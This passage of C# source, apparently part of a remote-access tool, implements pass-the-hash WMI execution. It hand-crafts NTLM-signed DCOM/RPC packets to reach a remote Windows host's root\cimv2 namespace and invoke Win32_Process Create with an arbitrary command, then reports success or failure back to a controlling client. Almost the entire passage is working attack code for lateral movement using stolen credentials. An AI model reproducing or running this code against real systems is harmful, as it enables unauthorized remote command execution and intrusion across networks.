                            RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                            WMI_client_send = RPC;
                            WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                            WMI_client_random_port_stream.Flush();
                            packet_RPC = PTHWMIExecHelper.GetPacketRPCRequest(new byte[] { 0x83 }, 76, 16, 4, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x03, 0x00 }, object_UUID);
                            OrderedDictionary packet_rem_query_interface = PTHWMIExecHelper.GetPacketDCOMRemQueryInterface(causality_ID_bytes, IPID, new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 });
                            OrderedDictionary packet_NTLMSSP_verifier = PTHWMIExecHelper.GetPacketNTLMSSPVerifier(4, new byte[] { 0x04 }, sequence_number);
                            RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                            byte[] rem_query_interface = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_rem_query_interface);
                            byte[] NTLMSSP_verifier = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                            HMAC_MD5.Key = client_signing_key;
                            byte[] RPC_Sign = PTHWMIExecHelper.CombineByteArray(sequence_number, RPC);
                            RPC_Sign = PTHWMIExecHelper.CombineByteArray(RPC_Sign, rem_query_interface);
                            RPC_Sign = PTHWMIExecHelper.CombineByteArray(RPC_Sign, PTHWMIExecHelper.getByteRange(NTLMSSP_verifier, 0, 11));
                            byte[] RPC_signature = HMAC_MD5.ComputeHash(RPC_Sign);
                            RPC_signature = PTHWMIExecHelper.getByteRange(RPC_signature, 0, 7);
                            packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = RPC_signature;
                            NTLMSSP_verifier = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                            WMI_client_send = PTHWMIExecHelper.CombineByteArray(RPC, rem_query_interface);
                            WMI_client_send = PTHWMIExecHelper.CombineByteArray(WMI_client_send, NTLMSSP_verifier);
                            WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                            WMI_client_random_port_stream.Flush();
                            WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                            WMI_client_stage = "exit";


                            if (WMI_client_receive[2] == 3 && BitConverter.ToString(PTHWMIExecHelper.getByteRange(WMI_client_receive, 24, 27)) == "05-00-00-00")
                            {
                                //TODO Packet Response
                                new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: WMI Access Denied", false).Execute(client);
                            }
                            else if (WMI_client_receive[2] == 3 && BitConverter.ToString(PTHWMIExecHelper.getByteRange(WMI_client_receive, 24, 27)) != "05-00-00-00")
                            {
                                string error_code = BitConverter.ToString(new byte[] { WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24] });
                                string[] error_code_array = error_code.Split('-');
                                error_code = string.Join("", error_code_array);
                                //TODO Packet Response
                                new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: error code: " + error_code.ToString(), false).Execute(client);
                            }
                            else if (WMI_client_receive[2] == 2)
                            {
                                WMI_data = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                                OXID_index = WMI_data.IndexOf(OXID);
                                OXID_bytes_index = OXID_index / 2;
                                object_UUID2 = PTHWMIExecHelper.getByteRange(WMI_client_receive, OXID_bytes_index + 16, OXID_bytes_index + 31);
                                WMI_client_stage = "AlterContext";
                            }
                            else
                            {
                                //TODO Packet Response
                                new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: Unknown Error", false).Execute(client);
                            }
                            int request_split_index = 5500;
                            string WMI_client_stage_next = "";
                            bool request_split = false;
                            while (WMI_client_stage != "exit")
                            {
                                if (WMI_client_receive[2] == 3)
                                {
                                    //TODO Packet Response
                                    string error_code = BitConverter.ToString(new byte[] { WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24] });
                                    string[] error_code_array = error_code.Split('-');
                                    error_code = string.Join("", error_code_array);
                                    new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: error code: " + error_code.ToString(), false).Execute(client);
                                    WMI_client_stage = "exit";
                                }

                                switch (WMI_client_stage)
                                {
                                    case "AlterContext":
                                        {
                                            switch (sequence_number[0])
                                            {
                                                case 0:
                                                    {
                                                        alter_context_call_ID = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                        alter_context_context_ID = new byte[] { 0x02, 0x00 };
                                                        alter_context_UUID = new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 };
                                                        WMI_client_stage_next = "Request";


                                                    }
                                                    break;
                                                case 1:
                                                    {
                                                        //Failing here for some reason.
                                                        alter_context_call_ID = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                        alter_context_context_ID = new byte[] { 0x03, 0x00 };
                                                        alter_context_UUID = new byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 };
                                                        WMI_client_stage_next = "Request";
                                                    }
                                                    break;
                                                case 6:
                                                    {
                                                        alter_context_call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                        alter_context_context_ID = new byte[] { 0x04, 0x00 };
                                                        alter_context_UUID = new byte[] { 0x99, 0xdc, 0x56, 0x95, 0x8c, 0x82, 0xcf, 0x11, 0xa3, 0x7e, 0x00, 0xaa, 0x00, 0x32, 0x40, 0xc7 };
                                                        WMI_client_stage_next = "Request";
                                                    }
                                                    break;
                                            }
                                            packet_RPC = PTHWMIExecHelper.GetPacketRPCAlterContext(assoc_group, alter_context_call_ID, alter_context_context_ID, alter_context_UUID);
                                            RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                                            WMI_client_send = RPC;
                                            WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                                            WMI_client_random_port_stream.Flush();
                                            WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                            WMI_client_stage = WMI_client_stage_next;
                                        }
                                        break;
                                    case "Request":
                                        {
                                            switch (sequence_number[0])
                                            {
                                                case 0:
                                                    {
                                                        sequence_number = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                                        request_flags = new byte[] { 0x83 };
                                                        request_auth_padding = 12;
                                                        request_call_ID = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                        request_context_ID = new byte[] { 0x02, 0x00 };
                                                        request_opnum = new byte[] { 0x03, 0x00 };
                                                        request_UUID = object_UUID2;
                                                        hostname_length = BitConverter.GetBytes(auth_hostname.Length + 1);
                                                        WMI_client_stage_next = "AlterContext";

                                                        if (Convert.ToBoolean(auth_hostname.Length % 2))
                                                        {
                                                            auth_hostname_bytes = PTHWMIExecHelper.CombineByteArray(auth_hostname_bytes, new byte[] { 0x00, 0x00 });
                                                        }
                                                        else
                                                        {
                                                            auth_hostname_bytes = PTHWMIExecHelper.CombineByteArray(auth_hostname_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                        }

                                                        stub_data = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, hostname_length);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, hostname_length);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, auth_hostname_bytes);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, process_ID_Bytes);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                    }
                                                    break;
                                                case 1:
                                                    {
                                                        sequence_number = new byte[] { 0x02, 0x00, 0x00, 0x00 };
                                                        request_flags = new byte[] { 0x83 };
                                                        request_auth_padding = 8;
                                                        request_call_ID = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                        request_context_ID = new byte[] { 0x03, 0x00 };
                                                        request_opnum = new byte[] { 0x03, 0x00 };
                                                        request_UUID = IPID;
                                                        WMI_client_stage_next = "Request";
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                    }
                                                    break;
                                                case 2:
                                                    {
                                                        sequence_number = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                        request_flags = new byte[] { 0x83 };
                                                        request_auth_padding = 0;
                                                        request_call_ID = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                        request_context_ID = new byte[] { 0x03, 0x00 };
                                                        request_opnum = new byte[] { 0x06, 0x00 };
                                                        request_UUID = IPID;
                                                        WMI_namespace_length = BitConverter.GetBytes(target_short.Length + 14);
                                                        WMI_namespace_unicode = Encoding.Unicode.GetBytes("\\\\" + target_short + "\\root\\cimv2");
                                                        WMI_client_stage_next = "Request";

                                                        if (Convert.ToBoolean(target_short.Length % 2))
                                                        {
                                                            WMI_namespace_unicode = PTHWMIExecHelper.CombineByteArray(WMI_namespace_unicode, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                        }
                                                        else
                                                        {
                                                            WMI_namespace_unicode = PTHWMIExecHelper.CombineByteArray(WMI_namespace_unicode, new byte[] { 0x00, 0x00 });
                                                        }

                                                        stub_data = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, WMI_namespace_length);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, WMI_namespace_length);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, WMI_namespace_unicode);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x04, 0x00, 0x02, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x2d, 0x00, 0x55, 0x00, 0x53, 0x00, 0x2c, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                    }
                                                    break;
                                                case 3:
                                                    {
                                                        sequence_number = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                        request_flags = new byte[] { 0x83 };
                                                        request_auth_padding = 8;
                                                        request_context_ID = new byte[] { 0x00, 0x00 };
                                                        request_call_ID = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                        request_opnum = new byte[] { 0x05, 0x00 };
                                                        request_UUID = object_UUID;
                                                        WMI_client_stage_next = "Request";
                                                        WMI_data = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                                                        OXID_index = WMI_data.IndexOf(OXID);
                                                        OXID_bytes_index = OXID_index / 2;
                                                        IPID2 = PTHWMIExecHelper.getByteRange(WMI_client_receive, OXID_bytes_index + 16, OXID_bytes_index + 31);
                                                        OrderedDictionary packet_rem_release = PTHWMIExecHelper.GetPacketDCOMRemRelease(causality_ID_bytes, object_UUID2, IPID);
                                                        stub_data = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_rem_release);
                                                    }
                                                    break;
                                                case 4:
                                                    {
                                                        sequence_number = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                        request_flags = new byte[] { 0x83 };
                                                        request_auth_padding = 4;
                                                        request_context_ID = new byte[] { 0x00, 0x00 };
                                                        request_call_ID = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                        request_opnum = new byte[] { 0x03, 0x00 };
                                                        request_UUID = object_UUID;
                                                        WMI_client_stage_next = "Request";
                                                        packet_rem_query_interface = PTHWMIExecHelper.GetPacketDCOMRemQueryInterface(causality_ID_bytes, IPID2, new byte[] { 0x9e, 0xc1, 0xfc, 0xc3, 0x70, 0xa9, 0xd2, 0x11, 0x8b, 0x5a, 0x00, 0xa0, 0xc9, 0xb7, 0xc9, 0xc4 });
                                                        stub_data = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_rem_query_interface);


                                                    }
                                                    break;
                                                case 5:
                                                    {
                                                        sequence_number = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                        request_flags = new byte[] { 0x83 };
                                                        request_auth_padding = 4;
                                                        request_call_ID = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                        request_context_ID = new byte[] { 0x00, 0x00 };
                                                        request_opnum = new byte[] { 0x03, 0x00 };
                                                        request_UUID = object_UUID;
                                                        WMI_client_stage_next = "AlterContext";
                                                        packet_rem_query_interface = PTHWMIExecHelper.GetPacketDCOMRemQueryInterface(causality_ID_bytes, IPID2, new byte[] { 0x83, 0xb2, 0x96, 0xb1, 0xb4, 0xba, 0x1a, 0x10, 0xb6, 0x9c, 0x00, 0xaa, 0x00, 0x34, 0x1d, 0x07 });
                                                        stub_data = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_rem_query_interface);
                                                    }
                                                    break;
                                                case 6:
                                                    {
                                                        sequence_number = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                        request_flags = new byte[] { 0x83 };
                                                        request_auth_padding = 0;
                                                        request_context_ID = new byte[] { 0x04, 0x00 };
                                                        request_call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                        request_opnum = new byte[] { 0x06, 0x00 };
                                                        request_UUID = IPID2;
                                                        WMI_client_stage_next = "Request";
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                    }
                                                    break;
                                                case 7:
                                                    {
                                                        sequence_number = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                        request_flags = new byte[] { 0x83 };
                                                        request_auth_padding = 0;
                                                        request_context_ID = new byte[] { 0x04, 0x00 };
                                                        request_call_ID = new byte[] { 0x10, 0x00, 0x00, 0x00 };
                                                        request_opnum = new byte[] { 0x06, 0x00 };
                                                        request_UUID = IPID2;
                                                        WMI_client_stage_next = "Request";
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                        stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                    }
                                                    break;
                                                default:
                                                    {
                                                        if (sequence_number[0] >= 8)
                                                        {
                                                            sequence_number = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                            request_auth_padding = 0;
                                                            request_context_ID = new byte[] { 0x04, 0x00 };
                                                            request_call_ID = new byte[] { 0x0b, 0x00, 0x00, 0x00 };
                                                            request_opnum = new byte[] { 0x18, 0x00 };
                                                            request_UUID = IPID2;
                                                            byte[] stub_length = PTHWMIExecHelper.getByteRange(BitConverter.GetBytes(command.Length + 1769), 0, 1);
                                                            byte[] stub_length2 = PTHWMIExecHelper.getByteRange(BitConverter.GetBytes(command.Length + 1727), 0, 1); ;
                                                            byte[] stub_length3 = PTHWMIExecHelper.getByteRange(BitConverter.GetBytes(command.Length + 1713), 0, 1);
                                                            byte[] command_length = PTHWMIExecHelper.getByteRange(BitConverter.GetBytes(command.Length + 93), 0, 1);
                                                            byte[] command_length2 = PTHWMIExecHelper.getByteRange(BitConverter.GetBytes(command.Length + 16), 0, 1);
                                                            byte[] command_bytes = Encoding.UTF8.GetBytes(command);

                                                            string command_padding_check = Convert.ToString(Decimal.Divide(command.Length, 4));
                                                            if (command_padding_check.Contains(".75"))
                                                            {
                                                                command_bytes = PTHWMIExecHelper.CombineByteArray(command_bytes, new byte[] { 0x00 });
                                                            }
                                                            else if (command_padding_check.Contains(".5"))
                                                            {
                                                                command_bytes = PTHWMIExecHelper.CombineByteArray(command_bytes, new byte[] { 0x00, 0x00 });
                                                            }
                                                            else if (command_padding_check.Contains(".25"))
                                                            {
                                                                command_bytes = PTHWMIExecHelper.CombineByteArray(command_bytes, new byte[] { 0x00, 0x00, 0x00 });
                                                            }
                                                            else
                                                            {
                                                                command_bytes = PTHWMIExecHelper.CombineByteArray(command_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                            }
                                                            stub_data = new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, causality_ID_bytes);
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x06, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x63, 0x00, 0x72, 0x00, 0x65, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, stub_length);
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00 });
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, stub_length);
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x4d, 0x45, 0x4f, 0x57, 0x04, 0x00, 0x00, 0x00, 0x81, 0xa6, 0x12, 0xdc, 0x7f, 0x73, 0xcf, 0x11, 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24, 0x12, 0xf8, 0x90, 0x45, 0x3a, 0x1d, 0xd0, 0x11, 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24, 0x00, 0x00, 0x00, 0x00 });
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, stub_length2);
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x78, 0x56, 0x34, 0x12 });
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, stub_length3);
                                                            stub_data = PTHWMIExecHelper.CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x02, 0x53, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x03, 0x00, 0x00, 0x00, 0x2a, 0x00, 0x00, 0x00, 0x15, 0x01, 0x00, 0x00, 0x73, 0x01, 0x00, 0x00, 0x76, 0x02, 0x00, 0x00, 0xd4, 0x02, 0x00, 0x00, 0xb1, 0x03, 0x00, 0x00, 0x15, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x12, 0x04, 0x00, 0x80, 0x00, 0x5f, 0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45, 0x52, 0x53, 0x00, 0x00, 0x61, 0x62, 0x73, 0x74, 0x72, 0x61, 0x63, 0x74, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x94, 0x00, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x7c, 0x6c, 0x70, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x59, 0x01, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x11, 0x01, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0xe2, 0x01, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x7c, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x7c, 0x6c, 0x70, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x2b, 0x02, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xba, 0x02, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x2b, 0x02, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00, 0x72, 0x02, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 